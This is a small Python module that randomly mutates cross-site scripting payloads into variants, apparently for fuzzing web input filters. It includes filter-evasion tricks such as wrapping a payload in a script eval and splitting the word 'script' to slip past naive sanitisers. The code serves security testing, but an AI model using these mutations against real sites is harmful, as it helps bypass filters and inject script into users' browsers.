import random

def mutate_xss(payload):
    mutations = [
        lambda p: p.replace("alert", "confirm"),
        lambda p: p.replace("alert", "prompt"),
        lambda p: p.upper(),
        lambda p: f"`{p}`",
        lambda p: f'"{p}"',
        lambda p: f"<div>{p}</div>",
        lambda p: p[::-1],
        lambda p: p.replace("<", "&lt;").replace(">", "&gt;"),
        lambda p: f"<script>eval('{p}')</script>",
        lambda p: p.replace("script", "scr<script>ipt")
    ]
    return random.choice(mutations)(payload)

def mutate_batch(payload, count=5):
    return list(set([mutate_xss(payload) for _ in range(count)]))
